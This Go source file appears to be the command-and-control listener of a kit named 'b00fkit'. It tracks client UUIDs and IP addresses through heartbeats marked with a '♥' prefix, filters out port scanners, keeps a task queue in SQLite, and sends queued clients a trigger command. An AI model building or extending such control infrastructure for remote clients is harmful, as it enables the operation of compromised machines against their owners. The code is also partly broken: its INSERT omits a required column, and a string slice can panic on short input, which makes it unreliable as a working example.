package main

import (
    "fmt"
    "log"
    "net"
    "os"
    "time"
    "unicode/utf8"

    "b00fkit/asciiArt"
    "b00fkit/httpui"
    "b00fkit/sqldb"

    "github.com/spf13/viper"
)



func main() {
    viper.SetConfigName("config")
    viper.AddConfigPath(".")
    err := viper.ReadInConfig()
    if err != nil {
        log.Println("Error in config file: ", err)
    }

    // Configuration for listener 
    
    CONN_HOST := viper.GetString("listener.host")
    CONN_PORT := viper.GetString("listener.port")
    CONN_TYPE := "tcp"
    

    asciiArt.PrintArt1()

    // ----------- START DB -----------------------
    // database functionality. sqldb makes the database a global variable
    // ConnectDB() only needs to be ran once from main and the db is 
    // accessible anywhere by importing sqldb package like httpui for example
    sqldb.ConnectDB()

    // table: clients
    // columns:
    // id primary key
    // uuid text not null unique
    // ipaddr text
    // ts_first text not null -- timestamp of when first seen
    // ts_last text not null -- most recent timestamp
    statement, _ := sqldb.DB.Prepare("CREATE TABLE IF NOT EXISTS clients (id INTEGER PRIMARY KEY, uuid TEXT NOT NULL UNIQUE, ipaddr TEXT, ts_first TEXT NOT NULL, ts_last TEXT NOT NULL)")
    statement.Exec() 

    // table: tasks
    // columns:
    // id primary key
    // uuid text not null unique
    // task_queued integer
    // queue int
    // ts_last text -- timestamp of last execution
    statement, _ = sqldb.DB.Prepare("CREATE TABLE IF NOT EXISTS tasks (id INTEGER PRIMARY KEY, uuid TEXT NOT NULL UNIQUE, task_queued INTEGER, queue INTEGER, ts_last TEXT)")
    statement.Exec()
    // ------------ END DB ----------------------

    // listener 
    l, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
    if err != nil {
        fmt.Println("Encountered Error: ", err.Error())
        os.Exit(1)
    }

    defer l.Close()
    fmt.Println("Listening on " + CONN_HOST + ":" + CONN_PORT)

    go httpui.Start()

    // listener loop
    for {
        conn, err := l.Accept()
        if err != nil {
            fmt.Println("Error", err.Error())
            os.Exit(1)
        }

        go handleRequest(conn)
    }
}

//Listener Handler
func handleRequest(conn net.Conn) {
    defer conn.Close()
    buf := make([]byte, 36)

    req_size, err := conn.Read(buf)
    if err != nil {
        fmt.Println("Error", err.Error())
    }

    uuid := string(buf[:req_size])
    ipaddr := conn.RemoteAddr().String()

    //Data must begin with "♥" character to be accepted by listener in order to filter random incoming data (port scanners)
    checkchar, _ := utf8.DecodeRuneInString("♥")
    checkcharrecv, _ := utf8.DecodeRuneInString(uuid[0:3])

    t := time.Now()
    timestamp := t.Format("15:04:05 01-02-2006")

    if checkchar == checkcharrecv {
        // Hearbeat
        uuid = uuid[3:]
        
        statement, _ := sqldb.DB.Prepare("INSERT INTO clients (uuid, ipaddr, ts_last) VALUES (?, ?, ?)")
        statement.Exec(uuid, ipaddr, timestamp)

        statement, _ = sqldb.DB.Prepare("UPDATE clients SET ts_last = ? WHERE uuid = ?")
        statement.Exec(timestamp, uuid)

        fmt.Printf("\033[2K\rLast Seen: %s [%s] @ %s", uuid, ipaddr, timestamp)

        // Task checking
        var task_queued int
        task_row := sqldb.DB.QueryRow("SELECT task_queued FROM tasks WHERE uuid = $1", uuid)
        task_row.Scan(&task_queued)

        print(task_queued)

        if task_queued != 0 {                           // var x int; x != 0 will make int behave as bool
            message := "awful\n"
            conn.Write([]byte(message))
            
            statement, _ = sqldb.DB.Prepare("UPDATE tasks SET task_queued = 0, ts_last = ? WHERE uuid = ?")
            statement.Exec(timestamp, uuid)
        }
        
    } 
}
